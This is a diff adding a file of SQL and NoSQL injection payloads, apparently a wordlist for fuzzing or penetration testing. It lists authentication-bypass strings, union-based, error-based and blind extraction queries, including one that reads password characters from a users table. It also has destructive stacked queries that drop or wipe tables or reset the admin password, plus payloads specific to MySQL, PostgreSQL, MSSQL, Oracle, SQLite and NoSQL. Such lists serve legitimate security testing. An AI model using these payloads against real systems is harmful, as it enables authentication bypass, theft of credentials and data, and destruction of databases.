@@ -1,0 +1,86 @@
+# SQL Injection Payloads
+
+# Basic SQL injection
+'
+''
+' OR '1'='1
+' OR 1=1--
+' OR 'a'='a
+" OR "1"="1
+" OR 1=1--
+admin' --
+admin' #
+admin'/*
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1'/*
+
+# Union-based SQL injection
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT 1,2,3--
+
+# Error-based SQL injection
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CAST((SELECT @@version) AS int)--
+' AND EXTRACTVALUE(1,CONCAT(0x5c,@@version))--
+' AND 1=UPDATEXML(1,CONCAT(0x5e24,(SELECT @@version),0x5e24),1)--
+
+# Boolean-based blind SQL injection
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(@@version,1,1)='5'--
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--
+
+# Time-based blind SQL injection
+'; WAITFOR DELAY '0:0:5'--
+'; SELECT SLEEP(5)--
+'; SELECT pg_sleep(5)--
+' AND SLEEP(5)--
+' AND 1=BENCHMARK(5000000,MD5('test'))--
+
+# Stacked queries
+'; DROP TABLE users--
+'; DELETE FROM users WHERE 1=1--
+'; INSERT INTO users VALUES ('hacker','pass')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+
+# Comment injection
+--
+-- -
+#
+/**/
+/*!50000*/
+
+# Database-specific payloads
+# MySQL
+' AND 'x'='x
+' AND SLEEP(5) AND 'x'='x
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+
+# PostgreSQL
+' AND 'x'='x
+'; SELECT pg_sleep(5)--
+
+# MSSQL
+' AND 'x'='x
+'; WAITFOR DELAY '00:00:05'--
+
+# Oracle
+' AND 'x'='x
+' AND 1=dbms_pipe.receive_message('a',5)--
+
+# SQLite
+' AND 'x'='x
+' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(5/2))))--
+
+# NoSQL injection
+{"$gt": ""}
+{"$ne": null}
+{"$where": "sleep(5000)"}
+' || '1'=='1
+admin' || 'a'=='a
